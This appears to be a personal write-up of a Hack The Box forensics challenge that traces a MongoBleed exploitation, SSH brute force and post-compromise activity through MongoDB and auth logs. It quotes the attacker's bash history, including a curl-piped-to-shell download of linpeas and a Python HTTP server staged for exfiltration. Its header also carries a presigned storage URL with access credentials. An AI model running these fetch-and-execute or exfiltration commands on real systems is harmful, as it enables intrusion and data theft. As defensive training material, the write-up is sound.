- **Date**: Wednesday, May 13, 2026
- **Username**: cartofelplm
- **Difficulty**: Very Easy
- **Tags**: #DFIR #CVE #Brute-force #MongoDB #Logs
- **Scenario**: You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation. You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.
- **Sherlock Info**: The Sherlock provides hands-on experience involving forensics and Incident response, including the MongoBleed Vulnerability. MongoBleed is a heap-memory disclosure vulnerability in the MongoDB Server. It arises in the server’s zlib compression handling logic, specifically in how it parses compressed network messages. By sending specially crafted messages with inconsistent length fields, an attacker can cause MongoDB to return uninitialized heap memory, potentially exposing sensitive in-memory data, without any authentication.
- **Official Writeup**: [here](https://htb-content-prod-private-storage.s3.eu-central-1.amazonaws.com/sherlocks/writeup/a0b95fe3-116c-47c8-9ab5-e86ae3049a38.pdf?X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA47CRVXI3GZ5T5FNV%2F20260513%2Feu-central-1%2Fs3%2Faws4_request&X-Amz-Date=20260513T102553Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Signature=0900b2b1b9f6e96ae4f5843c1a336e69c9a10363e9ad08d64ff2d1cc088efa95)
- **Video Walkthrough**: none
- **Impression**: nice

---
# Artefacts

We are provided with a `uac-mongodbsync-linux-triage` directory with the following structure:

```
└──╼ [*]$ ls
 '[root]'   bodyfile   hash_executables   live_response   system
```

---
# Questions

1. What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?

**Answer**: CVE-2025-14847

![[MangoBleed-1778668663175.webp]]

2. What is the version of MongoDB installed on the server that the CVE exploited?

**Answer**: 8.0.16

We look for files that include the keyword `mongo` within the filesystem provided:

```
└──╼ [*]$ find . -type f -name *mongo* ; 2>/dev/null 
./[root]/var/log/mongodb/mongod.log
./[root]/usr/lib/systemd/system/mongod.service
./[root]/lib/systemd/system/mongod.service
./[root]/etc/systemd/system/multi-user.target.wants/mongod.service
./[root]/etc/apt/sources.list.d/mongodb-org-8.0.list
./[root]/etc/mongod.conf
```

We analyze the log file and look for the keyword `version`:

```
cat \[root\]/var/log/mongodb/mongod.log | grep version
{"t":{"$date":"2025-12-29T05:11:47.713+00:00"},"s":"I",  "c":"CONTROL",  "id":23403,   "ctx":"initandlisten","msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16","gitVersion":"ba70b6a13fda907977110bf46e6c8137f5de48f6","openSSLVersion":"OpenSSL 3.0.13 30 Jan 2024","modules":[],"allocator":"tcmalloc-google","environment":{"distmod":"debian12","distarch":"x86_64","target_arch":"x86_64"}}}}
{"t":{"$date":"2025-12-29T05:11:47.713+00:00"},"s":"I",  "c":"CONTROL",  "id":51765,   "ctx":"initandlisten","msg":"Operating System","attr":{"os":{"name":"Ubuntu","version":"24.04"}}}
{"t":{"$date":"2025-12-29T05:11:48.489+00:00"},"s":"I",  "c":"STORAGE",  "id":20320,   "ctx":"initandlisten","msg":"createCollection","attr":{"namespace":"admin.system.version","uuidDisposition":"provided","uuid":{"uuid":{"$uuid":"1cb5b979-f4f8-4899-b083-cb7493c90db8"}},"options":{"uuid":{"$uuid":"1cb5b979-f4f8-4899-b083-cb7493c90db8"}}}}
{"t":{"$date":"2025-12-29T05:11:48.504+00:00"},"s":"I",  "c":"INDEX",    "id":20345,   "ctx":"initandlisten","msg":"Index build: done building","attr":{"buildUUID":null,"collectionUUID":{"uuid":{"$uuid":"1cb5b979-f4f8-4899-b083-cb7493c90db8"}},"namespace":"admin.system.version","index":"_id_","ident":"index-1-914848041129764209","collectionIdent":"collection-0-914848041129764209","commitTimestamp":null}}
{"t":{"$date":"2025-12-29T05:16:58.104+00:00"},"s":"I",  "c":"CONTROL",  "id":23403,   "ctx":"initandlisten","msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16","gitVersion":"ba70b6a13fda907977110bf46e6c8137f5de48f6","openSSLVersion":"OpenSSL 3.0.13 30 Jan 2024","modules":[],"allocator":"tcmalloc-google","environment":{"distmod":"debian12","distarch":"x86_64","target_arch":"x86_64"}}}}
{"t":{"$date":"2025-12-29T05:16:58.104+00:00"},"s":"I",  "c":"CONTROL",  "id":51765,   "ctx":"initandlisten","msg":"Operating System","attr":{"os":{"name":"Ubuntu","version":"24.04"}}}
{"t":{"$date":"2025-12-29T06:09:34.806+00:00"},"s":"I",  "c":"CONTROL",  "id":23403,   "ctx":"initandlisten","msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16","gitVersion":"ba70b6a13fda907977110bf46e6c8137f5de48f6","openSSLVersion":"OpenSSL 3.0.13 30 Jan 2024","modules":[],"allocator":"tcmalloc-google","environment":{"distmod":"debian12","distarch":"x86_64","target_arch":"x86_64"}}}}
{"t":{"$date":"2025-12-29T06:09:34.806+00:00"},"s":"I",  "c":"CONTROL",  "id":51765,   "ctx":"initandlisten","msg":"Operating System","attr":{"os":{"name":"Ubuntu","version":"24.04"}}}
```

3. Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE.

**Answer**: 65.0.76.43

There are multiple logs so we want to determine first what we deal with:

```
jq -r '.msg' var/log/mongodb/mongod.log | sort | uniq 
***** SERVER RESTARTED *****
Access control is not enabled for the database. Read and write access to data and configuration is unrestricted
Acquiring the ReplicationStateTransitionLock for shutdown
Acquiring the global lock for shutdown
Attempting to enter quiesce mode
Automatically disabling TLS 1.0, to force-enable TLS 1.0 specify --sslDisabledProtocols 'none'
Build Info
Clearing temp directory
Closing WiredTiger
Connection accepted
Connection ended
Deregistering all the collections
Dropping the scope cache for shutdown
Enqueuing the ReplicationStateTransitionLock for shutdown
Finished shutting down TTL collection monitor thread
Finished shutting down checkpoint thread
Finished shutting down journal flusher thread
Finished shutting down session sweeper thread
Flow Control is enabled on this deployment
For customers running the current memory allocator, we suggest changing the contents of the following sysfsFile
Implicit TCP FastOpen unavailable. If TCP FastOpen is required, set at least one of the related parameters
Index build: done building
Initialized wire specification
Initializing all collections in durable catalog
Initializing cluster server parameters from disk
Initializing durable catalog
Initializing full-time diagnostic data capture
Interrupted all currently running operations
Killing all operations for shutdown
Killing all outstanding egress activity.
Listening on
MongoDB starting
Multi threading initialized
Network interface redundant shutdown
Now exiting
Opening WiredTiger
Operating System
Options set by command line
Received signal
Retrieving all idents from storage engine
Sessions collection is not set up; waiting until next sessions reap interval
Setting featureCompatibilityVersion
Setting new configuration state
Shutdown: Closing listener sockets
Shutdown: Closing open transport sessions
Shutting down
Shutting down TTL collection monitor thread
Shutting down all TenantMigrationAccessBlockers on global shutdown
Shutting down all open transactions
Shutting down checkpoint thread
Shutting down full-time diagnostic data capture
Shutting down journal flusher thread
Shutting down session sweeper thread
Shutting down the ASIO transport SessionManager
Shutting down the Change Stream Expired Pre-images Remover
Shutting down the DiskSpaceMonitor
Shutting down the FLE Crud thread pool
Shutting down the FlowControlTicketholder
Shutting down the HealthLog
Shutting down the IndexBuildsCoordinator
Shutting down the LogicalSessionCache
Shutting down the MigrationUtilExecutor
Shutting down the MirrorMaestro
Shutting down the PeriodicThreadToAbortExpiredTransactions
Shutting down the ReplicaSetMonitor
Shutting down the ReplicationCoordinator
Shutting down the ShardingInitializationMongoD
Shutting down the TTL monitor
Shutting down the WaitForMajorityService
Shutting down the global connection pool
Shutting down the storage engine
Signal was sent by kill(2)
Starting TenantMigrationAccessBlockerRegistry
Starting the DiskSpaceMonitor
Stepping down the ReplicationCoordinator for shutdown
Stopping further Flow Control ticket acquisitions.
Storage engine to use detected by data files
Timestamp monitor shutting down
Timestamp monitor starting
Updated wire specification
Use of deprecated server parameter 'sslMode', please use 'tlsMode' instead.
Use of deprecated server parameter name
Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem
Waiting for connections
We suggest setting the contents of sysfsFile to 0.
WiredTiger closed
WiredTiger message
WiredTiger opened
WiredTiger recoveryTimestamp
WiredTigerKVEngine shutting down
createCollection
current featureCompatibilityVersion value
mongod shutdown complete
mongod startup complete
removing socket file
shutdown: removing fs lock...
will terminate after current cmd ends
```

We see the message "Connection accepted" which looks interesting.

```
└──╼ [*]$ jq -r 'select(.msg=="Connection accepted")' var/log/mongodb/mongod.log | head -50
{
  "t": {
    "$date": "2025-12-29T05:25:52.743+00:00"
  },
  "s": "I",
  "c": "NETWORK",
  "id": 22943,
  "ctx": "listener",
  "msg": "Connection accepted",
  "attr": {
    "remote": "65.0.76.43:35340",
    "isLoadBalanced": false,
    "uuid": {
      "uuid": {
        "$uuid": "099e057e-11c1-46ed-b129-a158578d2014"
      }
    },
    "connectionId": 1,
    "connectionCount": 1
  }
}
{
  "t": {
    "$date": "2025-12-29T05:25:52.745+00:00"
  },
  "s": "I",
  "c": "NETWORK",
  "id": 22943,
  "ctx": "listener",
  "msg": "Connection accepted",
  "attr": {
    "remote": "65.0.76.43:35348",
    "isLoadBalanced": false,
    "uuid": {
      "uuid": {
        "$uuid": "de7eb8af-7ae8-4e03-bd86-433a12dd4de7"
      }
    },
    "connectionId": 2,
    "connectionCount": 1
  }
}
{
  "t": {
    "$date": "2025-12-29T05:25:52.747+00:00"
  },
  "s": "I",
  "c": "NETWORK",
  "id": 22943,
  "ctx": "listener",
  
  ...
```

4. Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)

**Answer**: 2025-12-29 05:25:52

```
└──╼ [*]$ cat var/log/mongodb/mongod.log | grep 65.0.76.43 | head -5
{"t":{"$date":"2025-12-29T05:25:52.743+00:00"},"s":"I",  "c":"NETWORK",  "id":22943,   "ctx":"listener","msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340","isLoadBalanced":false,"uuid":{"uuid":{"$uuid":"099e057e-11c1-46ed-b129-a158578d2014"}},"connectionId":1,"connectionCount":1}}
{"t":{"$date":"2025-12-29T05:25:52.744+00:00"},"s":"I",  "c":"NETWORK",  "id":22944,   "ctx":"conn1","msg":"Connection ended","attr":{"remote":"65.0.76.43:35340","isLoadBalanced":false,"uuid":{"uuid":{"$uuid":"099e057e-11c1-46ed-b129-a158578d2014"}},"connectionId":1,"connectionCount":0}}
{"t":{"$date":"2025-12-29T05:25:52.745+00:00"},"s":"I",  "c":"NETWORK",  "id":22943,   "ctx":"listener","msg":"Connection accepted","attr":{"remote":"65.0.76.43:35348","isLoadBalanced":false,"uuid":{"uuid":{"$uuid":"de7eb8af-7ae8-4e03-bd86-433a12dd4de7"}},"connectionId":2,"connectionCount":1}}
{"t":{"$date":"2025-12-29T05:25:52.746+00:00"},"s":"I",  "c":"NETWORK",  "id":22944,   "ctx":"conn2","msg":"Connection ended","attr":{"remote":"65.0.76.43:35348","isLoadBalanced":false,"uuid":{"uuid":{"$uuid":"de7eb8af-7ae8-4e03-bd86-433a12dd4de7"}},"connectionId":2,"connectionCount":0}}
{"t":{"$date":"2025-12-29T05:25:52.747+00:00"},"s":"I",  "c":"NETWORK",  "id":22943,   "ctx":"listener","msg":"Connection accepted","attr":{"remote":"65.0.76.43:35350","isLoadBalanced":false,"uuid":{"uuid":{"$uuid":"1ebcc10f-4bc3-45f3-b7c0-d2d48d3a1d74"}},"connectionId":3,"connectionCount":1}}
```

5. Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.

**Answer**: 75260

```
└──╼ [*]$ cat var/log/mongodb/mongod.log | grep 65.0.76.43 | wc -l
75260
```

6. The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?

**Answer**: 2025-12-29 05:40:03

Hint: Check /var/log/auth.log and look for activity originating from the IP Address associated with the CVE Exploitation. You will also find a previous successful login, which is immediately logged out at the same time, suggesting the use of brute-force automated tools. The hands-on SSH session remains active for around 8 minutes before closing.

We follow the hint:

```
└──╼ [*]$ cat var/log/auth.log | grep 65.0.76.43
2025-12-29T05:39:18.864074+00:00 ip-172-31-38-170 sshd[39814]: Received disconnect from 65.0.76.43 port 54962:11: Bye Bye [preauth]
2025-12-29T05:39:18.866641+00:00 ip-172-31-38-170 sshd[39814]: Disconnected from authenticating user mongoadmin 65.0.76.43 port 54962 [preauth]

...

2025-12-29T05:40:03.475659+00:00 ip-172-31-38-170 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
2025-12-29T05:48:28.249844+00:00 ip-172-31-38-170 sshd[40027]: Received disconnect from 65.0.76.43 port 46062:11: disconnected by user
2025-12-29T05:48:28.250045+00:00 ip-172-31-38-170 sshd[40027]: Disconnected from user mongoadmin 65.0.76.43 port 46062
```

```
└──╼ [*]$ cat var/log/auth.log | grep 39962
2025-12-29T05:40:03.475659+00:00 ip-172-31-38-170 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
2025-12-29T05:40:03.477802+00:00 ip-172-31-38-170 sshd[39962]: pam_unix(sshd:session): session opened for user mongoadmin(uid=1001) by mongoadmin(uid=0)
2025-12-29T05:48:28.250833+00:00 ip-172-31-38-170 sshd[39962]: pam_unix(sshd:session): session closed for user mongoadmin
```

We see that the account `mongoadmin` is being targeted as there are multiple failed attempts to login and at some point we see a successful one that is open for aprox 8 minutes. This is a good indication that the attacker has ssh access to the target device. 

7. Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.

**Answer**: `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`

Hint: Analyze bash history for the compromised account.

We know the `mongoadmin` account was the one compromised, so we traverse to `[root]/home/mongoadmin` and take a look at `.bash_history`:

```
└──╼ [*]$ cat .bash_history 
ls -la
whoami
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
cd /data
cd ~
ls -al
cd /
ls
cd /var/lib/mongodb/
ls -la
cd ../
which zip
apt install zip
zip
cd mongodb/
python3
python3 -m http.server 6969
exit
```

8. The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?

**Answer**: /var/lib/mongodb/

In the output from the previous command, we see the attacker moving to `/var/lib/mongodb/` and starting a Python server, which indicated potential data exfiltration.

---
# Tools Used

List of tools used: nothing out of common.

---
